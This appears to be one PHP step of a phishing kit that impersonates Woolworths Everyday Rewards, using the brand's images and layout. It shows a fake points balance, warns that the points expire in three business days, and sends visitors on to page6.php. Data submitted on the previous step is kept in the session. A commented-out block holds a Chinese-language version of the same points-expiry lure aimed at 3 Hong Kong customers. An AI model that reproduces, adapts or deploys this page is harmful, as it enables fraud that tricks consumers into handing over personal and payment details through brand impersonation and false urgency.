<?php
session_start();
require_once 'config.php';
//print_r($_POST);exit;

include('partials/header.php');


if (isset($_POST['submit']) || isset($_POST['email'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>



<style>
    p { font-weight: 400 !important; }

    .ed-rewards-wrapper {
        max-width: 100%;
        width: 100%;
        margin: 0 auto;
    }
    
    .ed-rewards-container {
        display: flex;
        flex-direction: column;
        background-color: #FFAD8B;
    }
    
    .ed-rewards-container h1 {
        font-size: 40px;
        margin-bottom: 24px;
        max-width: 280px;
        margin-left: auto;
        margin-right: auto;
        line-height: 42px;
    }
    
    .ed-rewards-container p {
        font-size: 18px;
        line-height: 28px;
        max-width: 264px;
        margin: 0 auto 24px;
        font-family: "Fresh Sans Regular", Roboto Regular, Arial, sans-serif;
    }
    
    .link-card-btn {
        padding: 0 40px;
        color: #fff;
        background: #3a474e;
        width: 280px;
        font-size: 16px;
        display: inline-flex;
    }
    
    .link-card-btn i {
        vertical-align: middle;
        padding-left: 5px;
    }
    
    .ed-rewards-left-container {
        width: 100%;
        padding: 40px 20px 20px 20px;
        text-align: center;
    }
    
    .ed-rewards-right-container {
        width: 100%;
        background-image: url("https://cdn0.woolworths.media/content/content/3001-ed-reward-hero.png");
        background-repeat: no-repeat;
        background-position: bottom;
        background-size: contain;
        height: 60vw;
    }
    
    @media (min-width: 768px) {
        .ed-rewards-right-container {
            height: 43vw;
        }
        
        .link-card-btn {
            /*width: auto;*/
            width: fit-content;
        }
    }
    
    @media (min-width: 960px) {
        .ed-rewards-right-container {
            height: 30vw;
        } 
    }
    
    @media (min-width: 1220px) {
        
        .ed-rewards-container {
            flex-direction: row;
        }
        
        .ed-rewards-left-container {
            width: 55%;
            padding: 38px 64px 38px 100px;
            text-align: left;
        }
        
        .ed-rewards-right-container {
            width: 45%;
            height: auto;
        }
        
        .ed-rewards-container h1 {
            font-size: 48px;
            margin-bottom: 40px;
            max-width: none;
        }
        
        .ed-rewards-container p {
            margin-bottom: 40px;
            max-width: none;
        }
    }
    
    @media (min-width: 1360px) {
        
        .ed-rewards-left-container {
            padding: 100px 64px 100px 100px;
        }
    }
</style>
<section class="ed-rewards-header">
    <div class="ed-rewards-wrapper">
        <div class="ed-rewards-container">
            <div class="ed-rewards-left-container">
                <h1>Available Points: 1260 Pts</h1>
                <p>Points will expire in 3 business days, please redeem your prizes as soon as possible!</p>
                <a href="page6.php" class="button link-card-btn">Continued<i class="iconAct-Chevron_Right"></i></a>
            </div>
            <div class="ed-rewards-right-container"></div>
        </div>
    </div>
</section>

<style type="text/css" media="all">
.dcp-section {
    background: #fff;
}  
.nav-grid {
  display: -ms-grid;
  display: grid;
  gap: 10px;
  grid-auto-flow: row;
  margin-bottom: 24px;
  -ms-grid-columns: (1fr)[2];
      grid-template-columns: repeat(2, 1fr);
  -ms-grid-rows: (1fr)[2];
      grid-template-rows: repeat(2, 1fr); }

#navTitle {
  font-size: 28px;
  font-family: "Fresh Sans Medium", Arial, Helvetica, sans-serif;
  margin: 56px 0 32px;
  line-height: 32px; }

.nav-grid > a {
  display: block;
  color: #3a474e;
  line-height: 1.5em; }

.nav-grid > a:hover, .nav-grid > button:hover {
  text-decoration: underline; }
  .nav-grid > a:hover img, .nav-grid > button:hover img {
    box-shadow: 0px 2px 12px -2px rgba(58, 71, 78, 0.08), 0px 2px 4px -2px rgba(58, 71, 78, 0.15), 0px 4px 8px rgba(58, 71, 78, 0.15); }

.nav-button {
  background: none;
  border: 0;
  cursor: pointer;
  padding: 0;
  border-radius: 8px; }

.nav-box {
  width: 100%;
  display: -ms-flexbox;
  display: flex;
  -ms-flex-align: center;
      align-items: center;
  -ms-flex-pack: start;
      justify-content: flex-start; }
  .nav-box .nav-img-box {
    height: 64px;
    -ms-flex: 0 0 64px;
        flex: 0 0 64px;
    margin-right: 16px; }
    .nav-box .nav-img-box img {
      border-radius: 8px;
      height: 100%;
      width: 100%; }
  .nav-box .nav-text-box {
    font-family: 'Fresh Sans Medium', Helvetica, Arial, sans-serif;
    text-align: left; }

.nav-grid > button {
  display: block;
  color: #3a474e; }

.nav-grid > button:hover {
  text-decoration: underline; }

.nav-grid > button:hover img {
  box-shadow: 0px 2px 12px -2px rgba(58, 71, 78, 0.08), 0px 2px 4px -2px rgba(58, 71, 78, 0.15), 0px 4px 8px rgba(58, 71, 78, 0.15); }
  
.dcp-section .dcp-section-wrapper {
    padding-bottom: 32px;
    padding-left: 32px;
    padding-right: 32px;
    max-width: 994px;
    margin-left: auto;
    margin-right: auto;
    overflow: hidden;
}

@media (min-width: 980px) {
    .nav-grid {
      -ms-grid-columns: (1fr)[4];
          grid-template-columns: repeat(4, 1fr);
      -ms-grid-rows: (1fr)[1];
          grid-template-rows: repeat(1, 1fr);
      margin-bottom: 32px; } }

@media (max-width: 1100px) {
  .nav-box .nav-img-box {
    margin-right: 10px; } 
    
    #topNav .dcp-section .dcp-section-wrapper {
        padding-left: 0;
        padding-right: 0;
        max-width: 1000px;
    }
}

@media (min-width: 500px) {
     .nav-grid {
        gap: 18px;
    }
}

@media (max-width: 505px) {
  .nav-box .nav-img-box {
    -ms-flex: 0 0 44px;
        flex: 0 0 44px;
    height: 44px; }
}

@media (max-width: 400px) {
  .nav-box .nav-text-box {
    font-size: 14px; } }
    
.dcp-section .fd-color {
    color: #00A5A8;
    font-size: 40px;
}

</style>
<div class="dcp-section" id="topNav">
    <div class="dcp-section-wrapper nav-wrapper">
        <div class="section-content">
            <h2 id="navTitle">On this page</h2>
            <nav class="nav-grid" aria-label="Learn how to maximise your Rewards menu" aria-describedby="navTitle">
                <a href="#howitworks" class="nav-button" aria-label="Scroll to how it works" aria-current="page">
                    <div class="nav-box">
                        <div class="nav-img-box">
                            <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-how-it-works-icon.svg" alt="" class="img-responsive">
                        </div>
                        <div class="nav-text-box">
                            How it works
                        </div>
                    </div>
                </a>
                <a href="#howtoboost" class="nav-button" aria-label="Scroll to how to boost your points balance" aria-current="page">
                    <div class="nav-box">
                        <div class="nav-img-box">
                            <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-how-to-boost-icon.svg" alt="" class="img-responsive">
                        </div>
                        <div class="nav-text-box">
                            How to boost your points balance
                        </div>
                    </div>
                </a>
                <a href="#discoverpartners" class="nav-button" aria-label="Scroll to Discover our Partners" aria-current="page">
                <div class="nav-box">
                    <div class="nav-img-box">
                        <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-discover-partners-icon.svg" alt="" class="img-responsive">
                    </div>
                    <div class="nav-text-box">
                        Discover our Partners
                    </div>
                </div>
                </a>
                <a href="#rewardapp" class="nav-button" aria-label="Scroll to even more ways with the rewards app" aria-current="page">
                    <div class="nav-box">
                        <div class="nav-img-box">
                            <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-rewards-app-icon.svg" alt="" class="img-responsive">
                        </div>
                        <div class="nav-text-box">
                            Enjoy even more with the Rewards App
                        </div>
                    </div>
                </a>
              
            </nav>
         
        </div>
    </div>
</div>


<style>

    .dcp-section-grey-bk {
/*        padding: 40px 0;*/
        background: #F2F2F2;
    }
    
    .dcp-section-grey-bk .ed-rewards-right-container {
        background-image: url(https://cdn0.woolworths.media/content/content/3001-boost-reward.png);
    }
    
    .curved-corners .ed-rewards-container {
        border-top-left-radius: 96px;
        border-bottom-right-radius: 96px;
        margin: 0 20px;
        border-top-right-radius: 4px;
        border-bottom-left-radius: 4px;
    }
    
    .curved-corners {
        margin-bottom: 40px;
    }
    
    .curved-corners .ed-rewards-left-container {
        padding: 64px 24px 10px;
    }
    
    #howtoboost h2 {
        margin-bottom: 24px;
        max-width: 280px;
        margin: 0 auto 24px;
    }
    
    #howtoboost .dcp-section-heading .link-card-btn {
        margin-top: 40px;
    }
    
    #howtoboost .dcp-section-content-item p {
        font-family: "Fresh Sans Medium", Roboto Medium, Arial, sans-serif;
    }
    
    .curved-corners h2 {
        font-size: 32px;
        max-width: 248px;
        line-height: 32px;
        margin-bottom: 24px; 
        margin-left: auto;
        margin-right: auto;
    }
    
    .dcp-section-grey-bk .dcp-section-content-item img {
        width: 100px;
    }
    
    .curved-corners .ed-rewards-container p {
        margin-bottom: 24px;
    }
    
    .dcp-section-grey-bk .dcp-section-content-item {
        padding: 20px 16px 10px;
    }
    
    @media (min-width: 768px) {
        #howtoboost h2 {
            max-width: none;
        }
    }
    
    @media (min-width: 1220px) {
        .curved-corners .ed-rewards-left-container {
            padding: 38px 64px;
        }
        
        .curved-corners .ed-rewards-right-container {
            background-position: bottom;
        }
        
        .curved-corners h2 {
            max-width: none;
        }
    }
    
    @media (min-width: 1360px) {
        .curved-corners .ed-rewards-left-container {
            padding: 64px;
            padding-top: 86px;
        }
    }
</style>
<style>

    .dcp-section-heading {
        text-align: center;
    }
    
    .dcp-section-heading h2 {
        font-size: 32px;
        line-height: 40px;
        margin-bottom: 34px;
    }
    
    a.link-card-btn:hover {
        background: #fff;
        color: #3a474e;
    }
    
    .dcp-section-heading .link-card-btn {
        margin-top: 40px;
    }
    
    .dcp-section-light-orange-bk {
        background: #FFDEB1;
    }
    
    .dcp-section-wrapper {
        max-width: 1440px;
        margin: 0 auto;
    }
    
    .dcp-section-content {
        padding: 40px 0;
    }
    
    .dcp-section-content-container {
        display: grid;
        grid-template-columns: 1fr;
        grid-template-rows: 1fr 1fr 1fr 1fr;
        gap: 24px;
    }
    
    .dcp-section-content-item {
        text-align: center;
        display: flex;
        justify-content: flex-start;
        flex-direction: column;
        align-items: center;
        background: #fff;
        padding: 10px 16px;
        margin: 0 24px;
        border-radius: 8px;
    }
    
    .dcp-section-content-item h3 {
        font-size: 20px;
        line-height: 24px;
        max-width: 300px;
    }
    
    .dcp-section-content-item p {
        font-size: 18px;
        line-height: 1.5em;
        max-width: 314px;
        font-family: 'Fresh Sans Regular', Roboto Regular, Arial, sans-serif;
    }
    
    .dcp-section-content-item img {
        margin-bottom: 16px;
        width: 132px;
    }
    
    .dcp-section-content-item a {
        color: #D44500;
        font-family: "Fresh Sans Medium", Roboto Medium, Arial,sans-serif;
    }
    
    .grey-link {
        font-family: "Fresh Sans Medium", Roboto Medium, Arial, sans-serif;
        color: #3a474e;
    }
    
    .t-c-copy {
        font-family: "Fresh Sans Regular", Helvetica, Arial, sans-serif;
        max-width: 272px;
        margin: 0 auto;
        margin-top: 16px;
    }
    
    @media (min-width: 960px) {
        .dcp-section-content {
            padding: 72px 0;
            max-width: 994px;
            margin: 0 auto;
        }
        
        .dcp-section-heading h2 {
            margin-bottom: 64px;
        }
        .dcp-section-content-container {
            grid-template-columns: 1fr 1fr 1fr 1fr;
            grid-template-rows: 1fr;
            gap: 0px 20px;
            margin: 0 24px;
        }
        
        .dcp-section-content-item {
            margin: 0;
        }
        
        .dcp-section-content-item img {
            margin-bottom: 24px;
        }
        
        .dcp-section-heading .link-card-btn {
            margin-top: 64px;
        }
        
        .t-c-copy {
            max-width: 457px;
        }
    }

    a.button { color: #fff }
</style>
<section class="dcp-section-grey-bk" id="howtoboost">
    <div class="dcp-section-wrapper">
        <div class="dcp-section-content">
             <div class="ed-rewards-wrapper curved-corners">
                <div class="ed-rewards-container">
                    <div class="ed-rewards-left-container">
                        <h2>Little boost, big rewards</h2>
                        <p>Launch your points higher with points boosters - offers created just for you sent straight to you in the app or your inbox.</p>
                        <a aria-label="Find out more about boost" href="page6.php" class="button link-card-btn">Find out more <i class="iconAct-Chevron_Right"></i></a>
                    </div>
                    <div class="ed-rewards-right-container"></div>
                </div>
            </div>
            <div class="dcp-section-heading">
                <h2>How to boost, shop and enjoy</h2>
            </div>
            <div class="dcp-section-content-container">
                <div class="dcp-section-content-item">
                    <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-inbox-icon.png" alt="" class="img-responsive" role="presentation">
                    <p>Keep an eye out in the Everyday Rewards app or your inbox</p>
                </div>
                <div class="dcp-section-content-item">
                    <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-boost-icon.png" alt="" class="img-responsive" role="presentation">
                    <p>Click the 'Boost now' buttons to boost the offer</p>
                </div>
                <div class="dcp-section-content-item">
                    <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-shop-icon.png" alt="" class="img-responsive" role="presentation">
                    <p>Shop in-store or online at Woolworths and partners</p>
                </div>
                <div class="dcp-section-content-item">
                    <img loading="lazy" src="https://cdn0.woolworths.media/content/content/3001-point-icon.png" alt="" class="img-responsive" role="presentation">
                    <p>Enjoy your boosted points balance</p>
                </div>
            </div>
            <div class="dcp-section-heading">
                <a aria-label="Find out more about boost" href="page6.php" class="button link-card-btn">Find out more <i class="iconAct-Chevron_Right"></i></a>
            </div>
        </div>
    </div>
</section>







<style>
    .wrap {
        padding: 30px 20px;
/*        margin-top:70px;*/
        padding-bottom: 0px;
    }
    @media only screen and (max-width: 1024px){
.planImages ul .gist[data-v-42547111] {

    font-size: 24px !important;

}
}
    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: red;
        font-size: 19px;
        font-weight: bold;
    }
    .notice {
        line-height:2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }
    @media(max-width: 767px) {
        .submit-btn {
            width: 100%;
            line-height: 60px;
            text-align: center;
            display: inline-block;
            color: #fff !important;
            border-radius: 30px;
            background: linear-gradient(56.78deg, #f70c93 0%, #7433df 63.27%, #2da9c8 100%);
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: red;
            border-color: red;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }
</style>
<!-- <div class="wrap">
    <div data-v-42547111="" class="planImages"><ul data-v-42547111=""><li data-v-42547111="" class="gist">積分到期提醒
</li></ul> <img data-v-42547111="" src="https://www.three.com.mo/assets/img/bannerM.29a04b8.png" alt=""></div>
    <a href="" class="main-logo">
        <i style="color:#ffb100;font-size:26px;" class="fa fa-warning"></i>
        積分有效期提示

    </a>

    <div class="notice" style="font-size:13px;">

        <p>尊敬的3香港客戶：<?php // echo isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <p>
            3香港積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p>
        </br>
        <p>
            3香港積分計劃為您帶來最新、最精彩的優惠，下載3香港緊貼最新資訊，輕輕鬆鬆就可以賺取3香港積分！
            積分可用於直接繳付賬單外，更可以兌換多種生活禮品包括超市禮券、咖啡現金券、儲值卡等。
            3香港積分碼的條款及細則
            除非另有規定，每個3香港積分只能使用一次。合資格客戶可於商戶發送3香港積分時所展示之條款及細則查閱其3香港積分碼之指定兌換有效期。3香港積分碼必須於指定兌換有效期前，於3香港兌換成3香港積分。3香港積分碼逾期將作廢並自動註銷，且不獲補發或延長兌換有效期。
            </br>
            如有任何爭議，3香港將保留一切最終決定權。
        </p>
    </div>
    <div class="center">
        <a href="page6.php" class="btn submit-btn">積分兌換</a>
    </div>
</div> -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
include('partials/footer.php');
